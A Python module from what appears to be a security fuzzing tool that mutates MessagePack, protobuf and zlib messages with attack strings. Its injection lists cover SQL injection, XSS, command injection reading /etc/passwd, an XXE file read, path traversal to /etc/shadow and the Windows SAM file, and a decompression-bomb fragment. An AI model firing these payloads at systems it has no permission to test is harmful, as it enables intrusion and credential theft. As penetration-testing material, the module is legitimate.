"""Binary payload generation and mutation strategies."""

import json
import struct
import zlib
from typing import List

from .console import Logger


class BinaryMutationMixin:
    def generate_binary_payloads(self, sample: bytes, vuln_type: str = 'all') -> List[bytes]:
        """
        Generate binary attack payloads based on a sample message.

        Args:
            sample: Sample binary message to base payloads on
            vuln_type: Target vulnerability type ('sqli', 'xss', 'cmdi', 'all')

        Returns:
            List of mutated binary payloads
        """
        fmt = self.detect_format(sample)
        payloads = []

        # Strategy 1: Raw binary injection (works for all formats)
        payloads.extend(self._raw_binary_injections(sample))

        # Strategy 2: Format-specific mutations
        if fmt.value == "msgpack" and self._msgpack_available:
            payloads.extend(self._msgpack_mutations(sample, vuln_type))
        elif fmt.value == "protobuf":
            payloads.extend(self._protobuf_mutations(sample, vuln_type))
        elif fmt.value == "compressed":
            payloads.extend(self._compressed_mutations(sample, vuln_type))

        # Strategy 3: Boundary testing
        payloads.extend(self._boundary_payloads(sample))

        Logger.info(f"Generated {len(payloads)} binary payloads for {fmt.value} format")
        return payloads

    def _raw_binary_injections(self, sample: bytes) -> List[bytes]:
        """Generate raw binary injection payloads."""
        text_payloads = [
            b"' OR 1=1--",
            b'<script>alert(1)</script>',
            b'; ls -la',
            b'{{7*7}}',
            b'../../etc/passwd',
            b'\x00' * 100,  # NULL flood
            b'\xff' * 100,  # High-byte flood
        ]

        payloads = []
        for tp in text_payloads:
            # Append to sample
            payloads.append(sample + tp)
            # Prepend to sample
            payloads.append(tp + sample)
            # Replace middle section
            if len(sample) > 10:
                mid = len(sample) // 2
                payloads.append(sample[:mid] + tp + sample[mid:])

        return payloads

    def _msgpack_mutations(self, sample: bytes, vuln_type: str) -> List[bytes]:
        """Generate MessagePack-specific attack payloads."""
        payloads = []
        try:
            import msgpack

            parsed = msgpack.unpackb(sample, raw=False)
            if not isinstance(parsed, dict):
                return payloads

            injection_values = self._get_injection_values(vuln_type)

            for key in parsed:
                if isinstance(parsed[key], str):
                    for injection in injection_values:
                        mutated = dict(parsed)
                        mutated[key] = injection
                        payloads.append(msgpack.packb(mutated, use_bin_type=True))

                elif isinstance(parsed[key], (int, float)):
                    # Integer overflow / underflow
                    for val in [0, -1, 2**31, 2**63, -2**31, float('inf'), float('nan')]:
                        mutated = dict(parsed)
                        mutated[key] = val
                        try:
                            payloads.append(msgpack.packb(mutated, use_bin_type=True))
                        except (OverflowError, ValueError):
                            pass

        except (ImportError, EOFError, OverflowError, TypeError, ValueError) as exc:
            Logger.warning(f"MessagePack mutation skipped malformed sample: {exc}")

        return payloads

    def _protobuf_mutations(self, sample: bytes, vuln_type: str) -> List[bytes]:
        """Generate protobuf-targeted attack payloads."""
        payloads = []
        parsed = self._parse_protobuf_heuristic(sample)

        injection_values = self._get_injection_values(vuln_type)

        for field_name, value in parsed.items():
            if 'string' in field_name:
                for injection in injection_values:
                    # Rebuild the protobuf field with injection
                    field_num = int(field_name.split('_')[1])
                    tag = (field_num << 3) | 2  # wire_type = 2 (length-delimited)
                    encoded = injection.encode('utf-8')
                    length = len(encoded)

                    # Simple varint encoding for length
                    varint_bytes = self._encode_varint(length)
                    payload = bytes([tag]) + varint_bytes + encoded
                    payloads.append(payload)

        return payloads

    def _compressed_mutations(self, sample: bytes, vuln_type: str) -> List[bytes]:
        """Generate compressed payload mutations."""
        payloads = []
        try:
            decompressed = zlib.decompress(sample)

            injection_values = self._get_injection_values(vuln_type)
            for injection in injection_values:
                # Inject into decompressed data and recompress
                mutated = decompressed + injection.encode('utf-8')
                payloads.append(zlib.compress(mutated))

                # Also try with the injection replacing the end
                if len(decompressed) > 20:
                    mutated = decompressed[:-20] + injection.encode('utf-8')
                    payloads.append(zlib.compress(mutated))

        except zlib.error as exc:
            Logger.warning(f"Compressed mutation skipped invalid stream: {exc}")

        # Also send decompression bomb
        payloads.append(zlib.compress(b'\x00' * 1000000)[:100])  # Compressed null bomb

        return payloads

    def _boundary_payloads(self, sample: bytes) -> List[bytes]:
        """Generate boundary condition payloads."""
        return [
            b'',                           # Empty message
            b'\x00',                       # Single NULL
            sample[:1],                    # Truncated (1 byte)
            sample[:len(sample)//2],       # Truncated (half)
            sample * 100,                  # Oversized message
            bytes(reversed(sample)),       # Reversed bytes
            bytes([b ^ 0xFF for b in sample]),  # Bitflipped
            sample + b'\x00' * 1000,       # Padded with NULLs
        ]

    def _get_injection_values(self, vuln_type: str) -> List[str]:
        """Get text injection values for a vulnerability type."""
        injections = {
            'sqli': [
                "' OR 1=1--",
                "'; DROP TABLE users;--",
                "1 UNION SELECT null,null,null--",
                "admin'--",
            ],
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><svg onload=alert(1)>',
                "javascript:alert(document.cookie)",
            ],
            'cmdi': [
                '; cat /etc/passwd',
                '| whoami',
                '$(id)',
                '`id`',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            'traversal': [
                '../../etc/passwd',
                '..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
            ],
        }

        if vuln_type == 'all':
            all_inj = []
            for vals in injections.values():
                all_inj.extend(vals)
            return all_inj

        return injections.get(vuln_type, injections.get('sqli', []))

    def _encode_varint(self, value: int) -> bytes:
        """Encode an integer as a protobuf varint."""
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    # ─── Analysis & Reporting ───────────────────────────────────────



__all__ = ["BinaryMutationMixin"]
